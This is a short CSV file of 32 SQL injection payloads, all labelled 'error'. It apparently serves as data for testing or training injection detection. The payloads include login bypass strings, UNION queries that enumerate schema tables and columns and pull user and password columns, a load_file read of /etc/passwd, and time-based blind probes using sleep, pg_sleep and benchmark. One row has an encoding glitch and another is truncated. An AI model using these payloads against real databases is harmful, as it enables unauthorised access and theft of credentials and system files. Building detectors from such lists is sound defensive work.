index,type,query
0,error,"' OR 1=1 #"
1,error,"' OR ''='"
2,error,"' OR 0=0 #"
3,error,"' OR 1 --'"
4,error,"' OR 1=1 or ''='"
5,error,"' OR 'x'='x"
6,error,"1â€™ OR 1=1#"
7,error,"1' order by 2#"
8,error,"' UNION SELECT 1,2#"
9,error,"' UNION SELECT DATABASE(),version()#"
10,error,"' UNION SELECT 1,GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where table_schema=DATABASE()#"
11,error,"' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns where TABLE_NAME='users'#"
12,error,"' UNION SELECT 1,CONCAT_ws('--',user,password) FROM users #"
13,error,"1' UNION SELECT user, password FROM users UNION SELECT 1,2'"
14,error,"' UNION ALL SELECT NULL, load_file("/etc/passwd") #"
15,error,"1' UNION SELECT user, password FROM users UNION SELECT 1,2'"
16,error,"' UNION SELECT 1,GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where table_schema=DATABASE()#"
17,error,"1) OR pg_sleep(__TIME__)--"
18,error,"1) OR sleep(__TIME__)#"
19,error,"1)) OR benchmark(10000000,MD5(1))#"
20,error,"1;(load_file(char(47,101,116,99,47,112,97,115, ..."
21,error,"1 OR sleep(__TIME__)#"
22,error,"1)) OR pg_sleep(__TIME__)--"
23,error,"1)) OR sleep(__TIME__)#"
24,error,"x' OR 1=1 or 'x'='y"
25,error,"' OR 0=0 #"
26,error,"' OR user like '%"
27,error,"0 OR 1=1"
28,error,"1 OR 1 in (@@version)--"
29,error,"1 OR 1=1--"
30,error,"or 1=1--"
31,error,"%' and 1=0 UNION SELECT NULL, TABLE_NAME FROM information_schema.tables #"